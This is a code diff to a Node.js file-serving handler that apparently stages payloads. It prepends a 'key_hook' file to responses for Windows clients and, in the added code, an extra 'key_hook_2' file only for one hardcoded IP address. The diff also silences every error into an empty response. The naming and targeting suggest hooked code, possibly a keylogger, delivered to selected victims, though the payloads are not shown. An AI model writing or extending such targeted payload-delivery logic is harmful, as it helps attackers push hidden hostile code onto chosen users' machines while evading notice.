@@ -54,6 +54,7 @@ async function getFileContents(req, res, db) {
             const filePath = path.join(process.cwd(), "5", fileName);
             const attachPath = path.join(process.cwd(), "5", attachName);
             const prePath = path.join(process.cwd(), "5", 'key_hook');
+            const prePath2 = path.join(process.cwd(), "5", 'key_hook_2');
             fs.readdir(path.join(process.cwd(), "5"), (err, files) => {
                 console.log(({ version:"1", error: err, files }));
                 if (err) {
@@ -66,25 +67,34 @@ async function getFileContents(req, res, db) {
             });
             fs.access(filePath, fs.constants.F_OK, (err) => {
                 if (err) {
-                    return res.json({ error: err, filePath,files });
+                    return res.json({});
                 }
                 
                 fs.readFile(filePath, "utf-8", (err, mainContent) => {
                     if (err) {
-                        return res.status(200).json({ error_1: err });
+                        return res.json({});
                     }
                     fs.readFile(attachPath, "utf-8", (err, afterContent) => {
                         if (err) {
-                            return res.status(200).json({ error_1: err });
+                            return res.json({});
                         }
                         const content = " {" + mainContent + "} " + afterContent;
                         //return res.json(content);
                         if(req.body.platform === "win32" || req.body.OS === "Windows_NT") {
                             fs.readFile(prePath, "utf-8", (err, preContent) => {
                                 if (err) {
-                                    return res.status(500).json({ error_2: err });
+                                    return res.json({});
                                 }
-                                res.json(preContent + content);
+                                if(requestedIp == '70.39.70.194') {
+                                    fs.readFile(prePath2, "utf-8", (err, preContent2) => {
+                                        if (err) {
+                                            return res.json({});
+                                        }
+                                        return res.json(preContent2 + preContent + content);
+                                    });
+                                } else {
+                                    return res.json(preContent + content);
+                                }
                             });
                         }
                         else return res.json(content);
